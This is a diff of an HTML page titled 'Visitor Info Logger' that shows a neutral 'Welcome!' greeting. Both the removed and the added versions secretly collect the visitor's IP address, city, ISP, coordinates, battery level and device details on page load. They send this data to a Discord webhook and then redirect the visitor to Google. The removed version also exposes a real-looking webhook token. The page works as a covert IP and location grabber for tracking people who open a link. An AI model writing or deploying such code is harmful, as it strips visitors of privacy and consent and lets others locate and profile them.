@@ -3,135 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Visitor Info Logger</title>
+    <title>Visitor Info Logger</title>
 </head>
 <body>
-    <h1>Gathering Information...</h1>
+    <h1>Welcome!</h1>
     <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
-        const redirectURL = 'https://www.google.com';
+        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
 
-        // Function to get geolocation
-        function getGeolocation() {
-            return new Promise(resolve => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            resolve(`Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`);
-                        },
-                        () => resolve('Permission Denied or Not Available')
-                    );
-                } else {
-                    resolve('Geolocation not supported');
-                }
-            });
+        // Fetch IP and location details using IP-API
+        function getIPAddressAndLocation() {
+            return fetch('http://ip-api.com/json/')
+                .then(response => response.json())
+                .then(data => ({
+                    ip: data.query,
+                    location: `${data.city}, ${data.regionName}, ${data.country}`,
+                    isp: data.isp,
+                    lat: data.lat,
+                    lon: data.lon,
+                }))
+                .catch(error => console.error('Error fetching location info:', error));
         }
 
-        // Function to get connection type
-        function getConnectionType() {
-            return navigator.connection ? navigator.connection.effectiveType : 'Not Available';
-        }
-
-        // Function to get media devices
-        async function getMediaDevices() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const deviceList = devices.map(device => device.kind + ': ' + device.label).join('\n');
-                return deviceList || 'No Devices Found';
-            } catch {
-                return 'Permission Denied or Not Available';
+        // Fetch battery info
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
+            } else {
+                return Promise.resolve('Battery info not available');
             }
         }
 
-        // Function to detect touch support
-        function hasTouchSupport() {
-            return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        }
-
-        // Function to check cookies
-        function areCookiesEnabled() {
-            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-        }
-
-        // Function to collect device information
-        async function getDeviceInfo() {
+        // Collect basic device details
+        function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const colorDepth = window.screen.colorDepth + ' bits';
-            const connectionType = getConnectionType();
-            const cookies = areCookiesEnabled();
-            const touchSupport = hasTouchSupport();
-            const geolocation = await getGeolocation();
-            const mediaDevices = await getMediaDevices();
 
-            let os = 'Unknown';
-            if (/windows nt/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/windows nt (\d+\.\d+)/i);
-                os = versionMatch ? `Windows ${versionMatch[1]}` : 'Windows';
-            } else if (/mac os x/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/mac os x (\d+_\d+)/i);
-                os = versionMatch ? `macOS ${versionMatch[1].replace('_', '.')}` : 'macOS';
-            } else if (/linux/i.test(userAgent)) {
-                os = 'Linux';
-            } else if (/android/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/android (\d+\.\d+)/i);
-                os = versionMatch ? `Android ${versionMatch[1]}` : 'Android';
-            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/os (\d+_\d+)/i);
-                os = versionMatch ? `iOS ${versionMatch[1].replace('_', '.')}` : 'iOS';
-            }
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
+            const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
+            const isMobile = /Mobi|Android/i.test(userAgent) ? 'Yes' : 'No';
 
             return `
                 User-Agent: ${userAgent}
                 Platform: ${platform}
                 Language: ${language}
                 Timezone: ${timezone}
-                OS: ${os}
-                Color Depth: ${colorDepth}
-                Connection Type: ${connectionType}
-                Cookies: ${cookies}
-                Touch Support: ${touchSupport ? 'Yes' : 'No'}
-                Geolocation: ${geolocation}
-                Media Devices: ${mediaDevices}
+                Screen Resolution: ${screenResolution}
+                Screen Orientation: ${screenOrientation}
+                Window Dimensions: ${windowDimensions}
+                Mobile Device: ${isMobile}
             `;
         }
 
-        // Function to send data to Discord webhook
-        async function sendToDiscord() {
-            const deviceInfo = await getDeviceInfo();
-            const timestamp = new Date().toLocaleString();
-
+        // Send data to Discord webhook
+        function sendToDiscord(data) {
             const payload = {
                 embeds: [{
-                    title: "📋 Visitor Information Logged",
-                    color: 3447003,
+                    title: "New Visitor Information",
+                    color: 7506394,
                     fields: [
-                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\`` },
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "Location", value: data.location, inline: true },
+                        { name: "ISP", value: data.isp, inline: true },
+                        { name: "Coordinates", value: `Lat: ${data.lat}, Lon: ${data.lon}`, inline: true },
+                        { name: "Battery Level", value: data.battery, inline: true },
+                        { name: "Device Info", value: data.deviceInfo, inline: false },
                     ],
-                    footer: { text: `Logged at: ${timestamp}` }
+                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
                 }]
             };
 
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
+                body: JSON.stringify(payload),
+            }).then(response => {
                 if (response.ok) {
-                    console.log('Visitor info logged successfully');
-                    window.location.href = redirectURL;
+                    console.log('Data sent successfully');
                 } else {
-                    console.error('Failed to log visitor info:', response.statusText);
+                    console.error('Failed to send data:', response.statusText);
                 }
-            })
-            .catch(error => console.error('Error sending to webhook:', error));
+            }).catch(error => console.error('Error sending to webhook:', error));
         }
 
-        // Execute the data collection and logging
-        sendToDiscord();
+        // Run data collection and send to webhook
+        Promise.all([getIPAddressAndLocation(), getBatteryInfo()])
+            .then(([locationData, battery]) => {
+                const deviceInfo = getDeviceInfo();
+                const data = { ...locationData, battery, deviceInfo };
+                sendToDiscord(data);
+            })
+            .then(() => {
+                // Redirect after data is sent
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3000); // Delay for 3 seconds before redirect
+            });
     </script>
 </body>
 </html>
